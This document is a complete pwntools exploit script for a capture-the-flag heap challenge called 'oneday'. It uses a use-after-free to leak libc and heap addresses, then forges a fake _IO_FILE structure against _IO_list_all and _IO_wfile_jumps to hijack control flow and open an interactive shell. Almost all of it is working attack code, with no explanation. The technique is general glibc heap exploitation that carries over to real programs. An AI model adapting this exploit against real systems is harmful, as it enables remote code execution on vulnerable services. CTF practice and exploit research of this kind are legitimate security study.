# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    vuln: UAF in Del function
'''
from pwn import *

# define the context
binary_name = './oneday'
libc_name = './libc.so.6' if args.REMOTE \
    else './libc.so.6'
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
context.binary = elf
context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'DEBUG'

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
if args.REMOTE:
    io = remote('challenge.ctf.games', 30269)
elif args.GDB:
    io = gdb.debug(binary_name, gdbscript="""
        # brva 0x2333
        b free
        c
    """, aslr=False)
else:
    io = process(binary_name)

# exploiting code
key, small, medium, large = 10, 1, 2, 3

def Add(c):
    sla(b"enter your command: \n", b"1")
    sla(b"choise: ", str(c).encode())
  
def Del(i):
    sla(b"enter your command: \n", b"2")
    sla(b"Index: \n", str(i).encode())
  
def Read(i, data):
    sla(b"enter your command: \n", b"3")
    sla(b"Index: ", str(i).encode())
    sa(b"Message: \n", flat(data, length = 0x110 * key))
  
def Write(i):
    sla(b"enter your command: \n", b"4")
    sla(b"Index: ", str(i).encode())
    ru(b"Message: \n")
    m = rc(0x10)
    d1 = u64(m[:8])
    d2 = u64(m[8:])
    log.info(f"d1: {d1:#x}")
    log.info(f"d2: {d2:#x}")
    return d1, d2

def Bye():
    sla(b'enter your command: \n', b'9')

sla(b'enter your key >>\n', str(key).encode())

Add(medium)
Add(medium)
Add(small)

Del(2)
Del(1)
Del(0)

Add(small)
Add(small)
Add(small)
Add(small)

Del(3)
Del(5)
m1, m2 = Write(3)
libc.address = m1 - 0x1f2cc0
heap_base = m2 - 0x17f0

Del(4)
Del(6)

Add(large)
Add(small)
Add(small)

Del(8)
Add(large)

target_addr = libc.sym._IO_list_all
_IO_wfile_jumps = libc.sym._IO_wfile_jumps

_lock = libc.address + 0x1f5720
fake_IO_FILE = heap_base + 0x1810

f1 = FileStructure()
f1.flags = u64(b"  fa1c4".ljust(8, b"\x00"))
f1._IO_read_ptr = 0xa81
f1._lock = _lock
f1._wide_data = fake_IO_FILE + 0xe0
f1.vtable = _IO_wfile_jumps

payload = flat({
    0x8: target_addr - 0x20,
    0x10: {
        0: {
            0: bytes(f1),
            0xe0: { # _wide_data->_wide_vtable
                0x18: 0, # f->_wide_data->_IO_write_base
                0x30: 0, # f->_wide_data->_IO_buf_base
                0xe0: fake_IO_FILE + 0x200
            },
            0x200: {
                0x68: libc.sym.puts
            }
        },
        0xa80: [0, 0xab1]
    }
})

Read(5, payload)
Del(2)
Add(large)

Bye()

# interact with the shell
io.interactive()
